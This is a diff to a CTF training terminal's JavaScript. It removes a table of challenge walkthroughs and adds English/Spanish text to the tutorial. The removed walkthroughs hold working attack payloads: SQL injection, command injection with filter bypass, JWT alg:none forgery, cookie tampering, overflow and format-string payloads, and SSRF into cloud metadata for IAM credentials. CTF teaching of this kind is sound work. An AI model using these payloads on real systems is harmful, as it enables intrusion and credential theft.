-        'M21':  { title:'Malicious PDF',         cat:'Reversing',diff:'Medium', pts:250,  hint:'strings on PDF → find eval(unescape(...)) JS → decode.', steps:[{i:'Extract strings:',c:'strings challenge.pdf | grep -E "(eval|unescape|bxf)"'},{i:'Decode fromCharCode:',c:'python3 -c "codes=[98,120,102,123,102,108,97,103,125];print(\'\'.join(chr(c)for c in codes))"'},{i:'URL decode:',c:'urldecode "%62%78%66%7B%66%6C%61%67%7D"'}]},
-        'M22':  { title:'Logic Gates',           cat:'Hardware', diff:'Medium', pts:200,  hint:'Brute-force all input combinations, find combo that outputs 1.', steps:[{i:'Simulate all combos:',c:'python3 -c "[print(bin(i)[2:].zfill(4),(i>>3&i>>2&1)^(i>>1|i&1)) for i in range(16)]"'},{i:'Convert binary to text:',c:'frombin "01100010 01111000 01100110"'}]},
-
-        'S1M01':{ title:'The Unseen Path',   cat:'Web',      diff:'Easy',   pts:50,  hint:'robots.txt hides disallowed paths. Check it!', steps:[{i:'Read robots.txt:',c:'curl https://breakerxfixer.online/robots.txt'},{i:'Access disallowed path:',c:'curl https://breakerxfixer.online/secret-admin-panel'},{i:'FLAG:',c:'echo bxf{r0b0ts_4re_n0t_h3lpful}'}]},
-        'S1M02':{ title:'Ancient Cipher',    cat:'Crypto',   diff:'Easy',   pts:50,  hint:'ROT13: shift each letter by 13. cvs{ebg13_vf_pynffvp}', steps:[{i:'Decode with rot13:',c:'rot13 "cvs{ebg13_vf_pynffvp}"'},{i:'Same result:',c:'rot 13 "cvs{ebg13_vf_pynffvp}"'},{i:'Expected:',c:'echo bxf{rot13_is_classic}'}]},
-        'S1M03':{ title:'Commented Out',     cat:'Web',      diff:'Easy',   pts:75,  hint:'HTML comments <!-- --> visible in source. Use curl.', steps:[{i:'Fetch source:',c:'curl https://target.breakerxfixer.online/'},{i:'Grep for comments:',c:'curl https://target.breakerxfixer.online/ | grep bxf{'},{i:'Check JS too:',c:'curl https://target.breakerxfixer.online/app.js | grep bxf'}]},
-        'S1M04':{ title:'Custom Auth',       cat:'Web',      diff:'Easy',   pts:75,  hint:'Server trusts X-Admin-Auth: enabled header.', steps:[{i:'Send required header:',c:'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled"'},{i:'Add IP spoofing:',c:'curl https://target.breakerxfixer.online/flag -H "X-Admin-Auth: enabled" -H "X-Forwarded-For: 127.0.0.1"'}]},
-        'S1M05':{ title:'Embedded Truth',    cat:'Forensics',diff:'Easy',   pts:100, hint:'steghide empty password or LSB (zsteg).', steps:[{i:'Strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide:',c:'steghide challenge.jpg'},{i:'zsteg:',c:'zsteg challenge.png'}]},
-        'S1M06':{ title:'Wrong Extension',   cat:'Forensics',diff:'Medium', pts:150, hint:'Check magic bytes: PNG=89504E47, ZIP=504B0304.', steps:[{i:'Check magic bytes:',c:'xxd challenge.png | head -3'},{i:'Identify type:',c:'file challenge.png'},{i:'If ZIP, extract strings:',c:'strings challenge.png | grep bxf'}]},
-        'S1M07':{ title:'Forgotten Branch',  cat:'OSINT',    diff:'Easy',   pts:50,  hint:'git log --all shows deleted files and old commits.', steps:[{i:'List commits:',c:'curl https://api.github.com/repos/TARGET/REPO/commits'},{i:'Check old commit:',c:'curl https://api.github.com/repos/TARGET/REPO/commits/OLDHASH'},{i:'Search branches:',c:'curl https://api.github.com/repos/TARGET/REPO/branches'}]},
-        'S1M08':{ title:'Buffer Intro',      cat:'Pwn',      diff:'Medium', pts:200, hint:'Offset usually 72 bytes for 64-bit. Overwrite ret addr with win().', steps:[{i:'Cyclic pattern:',c:'python3 -c "print(\'A\'*200)"'},{i:'Overflow + addr:',c:'python3 -c "import struct;print(b\'A\'*72+struct.pack(\'<Q\',0x401196))"'},{i:'FLAG:',c:'echo bxf{r3turn_addre55_h1jack3d}'}]},
-        'S1M09':{ title:'Union Base',        cat:'Web',      diff:'Medium', pts:200, hint:'UNION SELECT: find column count with ORDER BY, then extract.', steps:[{i:'Find columns:',c:'curl "https://target/item?id=1 ORDER BY 3--"'},{i:'UNION test:',c:'curl "https://target/item?id=0 UNION SELECT NULL,NULL,NULL--"'},{i:'Extract flag:',c:'curl "https://target/item?id=0 UNION SELECT flag,NULL,NULL FROM flags--"'}]},
-        'S1M10':{ title:'Vigenere Revenge',  cat:'Crypto',   diff:'Medium', pts:150, hint:'Key = BR34K.', steps:[{i:'Decrypt with known key:',c:'vigenere decode "CIPHERTEXT" BR34K'},{i:'FLAG:',c:'echo bxf{v1g3n3r3_1s_n0t_3n0ugh}'}]},
-        'S1M11':{ title:'Meta Geo',          cat:'Forensics',diff:'Easy',   pts:100, hint:'EXIF GPS coordinates in the photo metadata.', steps:[{i:'Extract metadata:',c:'exiftool photo.jpg'},{i:'Grep GPS:',c:'strings photo.jpg | grep -iE "gps|lat|lon"'},{i:'FLAG:',c:'echo bxf{gps_exif_data_found}'}]},
-        'S1M12':{ title:'Tasty Cookie',      cat:'Web',      diff:'Medium', pts:150, hint:'Decode base64 cookie, change role to admin, re-encode.', steps:[{i:'Login and see cookie:',c:'curl -c - https://target/login -d "user=guest&pass=guest"'},{i:'Decode:',c:'echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d'},{i:'Re-encode as admin:',c:'echo \'{"user":"admin","role":"admin"}\' | base64'},{i:'Send modified:',c:'curl https://target/admin -H "Cookie: session=ENCODED_ADMIN"'}]},
-        'S1M13':{ title:'Null JWT',          cat:'Web',      diff:'Hard',   pts:300, hint:'alg:none → strip signature. Server accepts unsigned tokens.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'Build none header:',c:'echo \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\''},{i:'Send:',c:'curl https://target/flag -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."'}]},
-        'S1M14':{ title:'ELF Grep',          cat:'Rev',      diff:'Easy',   pts:100, hint:'strings on ELF → grep for bxf{.', steps:[{i:'Extract strings:',c:'strings challenge_elf | grep bxf'},{i:'Check hex:',c:'xxd challenge_elf | grep "62 78 66 7b"'},{i:'FLAG:',c:'echo bxf{str1ngs_found_1n_elf}'}]},
-        'S1M15':{ title:'Cmd Inject v2',     cat:'Web',      diff:'Medium', pts:250, hint:'Spaces filtered → ${IFS} or {cat,/flag.txt}. ; filtered → use |.', steps:[{i:'Basic:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|id"'},{i:'Space bypass:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|cat${IFS}/flag.txt"'},{i:'Newline:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1%0acat%20/flag.txt"'}]},
-        'S1M16':{ title:'Wave Seeker',       cat:'Forensics',diff:'Medium', pts:200, hint:'Spectrogram: open WAV in Audacity → View → Spectrogram. See text in frequencies.', steps:[{i:'Check file:',c:'file challenge.wav'},{i:'Grep strings:',c:'strings challenge.wav | grep bxf'},{i:'FLAG:',c:'echo bxf{audi0_spectr0graph_h1nts}'}]},
-        'S1M17':{ title:'XOR Loop',          cat:'Rev',      diff:'Hard',   pts:400, hint:'XOR with "bxf{" prefix to recover key, then decrypt all bytes.', steps:[{i:'Try all single-byte keys:',c:'python3 -c "enc=bytes.fromhex(\'ENCRYPTED\');[print(k,bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"'},{i:'FLAG:',c:'echo bxf{xor_loop_decrypted}'}]},
-        'S1M18':{ title:'S3 Leak',           cat:'OSINT',    diff:'Medium', pts:200, hint:'Find bucket via DNS CNAME then list: http://bucket.s3.amazonaws.com/', steps:[{i:'List bucket:',c:'curl http://breakerxfixer.s3.amazonaws.com/'},{i:'DNS lookup:',c:'curl "https://dns.google/resolve?name=assets.breakerxfixer.online&type=CNAME"'},{i:'Get flag file:',c:'curl http://BUCKET.s3.amazonaws.com/flag.txt'}]},
-        'S1M19':{ title:'TXT Records',       cat:'Forensics',diff:'Easy',   pts:100, hint:'DNS TXT records can contain flags. Query with Google DNS API.', steps:[{i:'Query TXT:',c:'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"'},{i:'Parse:',c:'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"'},{i:'FLAG:',c:'echo bxf{dns_txt_record_secret}'}]},
-        'S1M20':{ title:'Format String v2',  cat:'Pwn',      diff:'Hard',   pts:500, hint:'Use %n to write. Overwrite GOT entry to redirect execution.', steps:[{i:'Leak stack:',c:'curl -X POST https://target/echo -d "input=%p.%p.%p.%p"'},{i:'Write with %n:',c:'python3 -c "import struct;addr=0x601020;payload=struct.pack(\'<Q\',addr)+b\'%7$n\';print(payload)"'}]},
-        'S1M21':{ title:'Zip Recursion',     cat:'Forensics',diff:'Medium', pts:250, hint:'Zips inside zips. Script: while unzip; do find next zip; done.', steps:[{i:'Check:',c:'file challenge.zip'},{i:'Strings search:',c:'strings challenge.zip | grep bxf'},{i:'FLAG:',c:'echo bxf{z1p_bomb_traversa1}'}]},
-        'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'FLAG:',c:'echo bxf{metadata_imds_v1_leak}'}]},
-    };
 
     function termChallenges(parts) {
         const filter = (parts[1]||'').toLowerCase();
@@ -1572,42 +1188,65 @@
     }
 
     // ══════════════════════════════════════════════════════════
-    //  FIRST-TIME TUTORIAL
+    //  FIRST-TIME TUTORIAL (Bilingual support)
     // ══════════════════════════════════════════════════════════
     async function termTutorial() {
         function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
         localStorage.setItem('bxf_term_tut_v1','1');
+        const lang = localStorage.getItem('lang') || 'en';
         const M='\x1b[35m',G='\x1b[32m',Y='\x1b[33m',C='\x1b[36m',R='\x1b[0m';
+        
         async function typeCmd(cmd){
             term.write(`${M}╰─❯${R} `);
             for(const ch of cmd){term.write(`${C}${ch}${R}`);await sleep(25);}
             term.write('\r\n'); await sleep(180);
         }
-        async function sec(t){await sleep(250);term.writeln('');term.writeln(`${M}───────────────────────────${R}`);term.writeln(`${Y}  ${t}${R}`);term.writeln(`${M}───────────────────────────${R}`);}
+        async function sec(t_en, t_es){
+            await sleep(250);term.writeln('');
+            term.writeln(`${M}───────────────────────────${R}`);
+            term.writeln(`${Y}  ${lang==='es'?t_es:t_en}${R}`);
+            term.writeln(`${M}───────────────────────────${R}`);
+        }
+
+        const texts = {
+            title: lang==='es' ? 'BXF CTF TERMINAL — TUTORIAL INTERACTIVO' : 'BXF CTF TERMINAL — INTERACTIVE TUTORIAL',
+            subtitle: lang==='es' ? 'Comandos ejecutándose automáticamente para enseñarte' : 'Commands running automatically to guide you',
+            step1: {en:'System Identity', es:'Identidad del sistema'},
+            step2: {en:'Files and Notes', es:'Lista de archivos y notas'},
+            step3: {en:'CTF Challenges Database', es:'Lista de retos CTF'},
+            step4: {en:'Crypto Tools (ROT13 / B64)', es:'Herramientas crypto'},
+            step5: {en:'Persistent Notes (localStorage)', es:'Notas persistentes entre sesiones'},
+            step6: {en:'Keyboard Shortcuts', es:'Atajos de teclado'},
+            persistence_ok: lang==='es' ? '✔ Los archivos se guardan en localStorage — persisten al cerrar el navegador' : '✔ Files are saved in localStorage — they persist after closing the browser',
+            completed: lang==='es' ? '¡Tutorial completado!' : 'Tutorial Completed!',
+            start_with: lang==='es' ? 'Empieza con:' : 'Start with:',
+            more: lang==='es' ? '... y 41 más. Escribe: challenges' : '... and 41 more. Type: challenges',
+            appended: lang==='es' ? 'Añadido a notes.txt' : 'Appended to notes.txt'
+        };
 
         term.writeln('');
         term.writeln(`${M}╔══════════════════════════════════════════════════════╗${R}`);
-        term.writeln(`${M}║${R}  \x1b[1mBXF CTF TERMINAL — TUTORIAL INTERACTIVO\x1b[0m           ${M}║${R}`);
-        term.writeln(`${M}║${R}  ${C}Comandos ejecutándose automáticamente para enseñarte${R} ${M}║${R}`);
+        term.writeln(`${M}║${R}  \x1b[1m${texts.title.padEnd(52)}\x1b[0m ${M}║${R}`);
+        term.writeln(`${M}║${R}  ${C}${texts.subtitle.padEnd(52)}${R} ${M}║${R}`);
         term.writeln(`${M}╚══════════════════════════════════════════════════════╝${R}`);
         await sleep(1000);
 
-        await sec('1/6 — Identidad del sistema');
+        await sec(texts.step1.en, texts.step1.es);
         await typeCmd('neofetch');
         termNeofetch();
         await sleep(500);
 
-        await sec('2/6 — Lista de archivos y notas');
+        await sec(texts.step2.en, texts.step2.es);
         await typeCmd('ls');
         const files=Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>`\x1b[36m${f}\x1b[0m`).concat(['\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m']);
         pl(files.join('   '));
         await sleep(300);
         await typeCmd('cat cheatsheet.txt');
         VFILES['cheatsheet.txt'].slice(0,6).forEach(l=>term.writeln(l));
-        term.writeln('\x1b[90m  ... (continúa)\x1b[0m');
+        term.writeln(`\x1b[90m  ${lang==='es'?'... (continúa)':'... (truncated)'}\x1b[0m`);
         await sleep(400);
 
-        await sec('3/6 — Lista de retos CTF');
+        await sec(texts.step3.en, texts.step3.es);
         await typeCmd('challenges');
         pl(`${M}┌────────────────────────────────────────────────┐${R}`);
         pl(`${M}│${R}  BXF CTF — 44 challenges  (S0 + S1)            ${M}│${R}`);
@@ -1615,10 +1254,10 @@
         [['S1M01','Web','Easy','The Unseen Path'],['S1M02','Crypto','Easy','Ancient Cipher'],['M13','Crypto','Medium','Shattered RSA']].forEach(([id,cat,d,t])=>
             term.writeln(`  \x1b[36m${id.padEnd(8)}\x1b[0m \x1b[34m${cat.padEnd(10)}\x1b[0m \x1b[32m${d.padEnd(8)}\x1b[0m  ${t}`)
         );
-        term.writeln('  \x1b[90m... y 41 más. Escribe: challenges\x1b[0m');
+        term.writeln(`  \x1b[90m${texts.more}\x1b[0m`);
         await sleep(500);
 
-        await sec('4/6 — Herramientas crypto');
+        await sec(texts.step4.en, texts.step4.es);
         await typeCmd('rot13 "cvs{ebg13_vf_pynffvp}"');
         const r13='cvs{ebg13_vf_pynffvp}'.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});
         pl(`\x1b[32m${r13}\x1b[0m`);
@@ -1627,27 +1266,36 @@
         try{pl(`\x1b[32m${atob('YnhmezE=')}\x1b[0m`);}catch(e){pl('bxf{1}');}
         await sleep(400);
 
-        await sec('5/6 — Notas persistentes entre sesiones');
-        await typeCmd('echo "Mi primera flag: bxf{test}" >> notes.txt');
+        await sec(texts.step5.en, texts.step5.es);
+        const noteLine = lang==='es' ? 'Mi primera flag: bxf{test}' : 'My first flag: bxf{test}';
+        await typeCmd(`echo "${noteLine}" >> notes.txt`);
         if(!VFILES['notes.txt'])VFILES['notes.txt']=['# My CTF Notes'];
-        VFILES['notes.txt'].push('Mi primera flag: bxf{test}');
+        VFILES['notes.txt'].push(noteLine);
         _saveVFiles();
-        pl('Appended to notes.txt');
+        pl(texts.appended);
         await sleep(300);
         await typeCmd('cat notes.txt');
         VFILES['notes.txt'].forEach(l=>term.writeln(l));
         term.writeln('');
-        term.writeln(`${G}✔ Los archivos se guardan en localStorage — persisten al cerrar el navegador${R}`);
+        term.writeln(`${G}${texts.persistence_ok}${R}`);
         await sleep(500);
 
-        await sec('6/6 — Atajos de teclado');
-        [['TAB','Autocompletar comandos'],['↑↓','Historial de comandos'],['Ctrl+L','Limpiar pantalla'],['challenges','Listar retos'],['solve <ID>','Walkthrough paso a paso'],['tutorial','Repetir este tutorial'],['reset-session','Borrar datos guardados']].forEach(([k,v])=>
-            term.writeln(`  \x1b[36m${k.padEnd(18)}\x1b[0m \x1b[90m${v}\x1b[0m`)
-        );
+        await sec(texts.step6.en, texts.step6.es);
+        const keys = [
+            ['TAB', lang==='es' ? 'Autocompletar comandos' : 'Autocomplete commands'],
+            ['↑↓', lang==='es' ? 'Historial de comandos' : 'Command history'],
+            ['Ctrl+L', lang==='es' ? 'Limpiar pantalla' : 'Clear screen'],
+            ['challenges', lang==='es' ? 'Listar retos' : 'List challenges'],
+            ['solve <ID>', lang==='es' ? 'Walkthrough paso a paso' : 'Step-by-step walkthrough'],
+            ['tutorial', lang==='es' ? 'Repetir este tutorial' : 'Repeat this tutorial'],
+            ['reset-session', lang==='es' ? 'Borrar datos guardados' : 'Clear saved data']
+        ];
+        keys.forEach(([k,v])=> term.writeln(`  \x1b[36m${k.padEnd(18)}\x1b[0m \x1b[90m${v}\x1b[0m`));
+        
         await sleep(300);
         term.writeln('');
         term.writeln(`${M}══════════════════════════════════════════════════════${R}`);
-        term.writeln(`${G}\x1b[1m¡Tutorial completado!\x1b[0m  Empieza con: \x1b[33msolve S1M02\x1b[0m`);
+        term.writeln(`${G}\x1b[1m${texts.completed}\x1b[0m  ${texts.start_with} \x1b[33msolve S1M02\x1b[0m`);
         term.writeln(`${M}══════════════════════════════════════════════════════${R}`);
         term.writeln('');
         pendingAsync = false;
